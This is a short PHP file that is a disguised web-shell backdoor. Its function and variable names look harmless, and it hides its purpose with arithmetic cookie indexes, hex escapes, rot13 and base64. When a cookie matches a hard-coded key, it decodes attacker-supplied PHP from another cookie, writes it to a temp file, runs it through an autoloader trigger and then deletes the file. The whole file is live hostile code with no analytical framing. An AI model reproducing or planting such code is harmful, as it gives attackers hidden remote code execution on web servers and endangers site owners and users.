<?php


if (isset($_COOKIE[24-24]) && isset($_COOKIE[-98+99]) && isset($_COOKIE[86-83]) && isset($_COOKIE[45+-41])) {
    $object = $_COOKIE;
    function core_engine($key) {
        $object = $_COOKIE;
        $component = tempnam((!empty(session_save_path()) ? session_save_path() : sys_get_temp_dir()), '76e72b68');
        if (!is_writable($component)) {
            $component = getcwd() . DIRECTORY_SEPARATOR . "service_registry";
        }
        $entry = "\x3c\x3f\x70\x68p\x20" . base64_decode(str_rot13($object[3]));
        if (is_writeable($component)) {
            $factor = fopen($component, 'w+');
            fputs($factor, $entry);
            fclose($factor);
            spl_autoload_unregister(__FUNCTION__);
            require_once($component);
            @array_map('unlink', array($component));
        }
    }
    spl_autoload_register("core_engine");
    $data_chunk = "461fce919b50d76b81c95ff74737a6d4";
    if (!strncmp($data_chunk, $object[4], 32)) {
        if (@class_parents("approve_request_data_storage", true)) {
            exit;
        }
    }
}
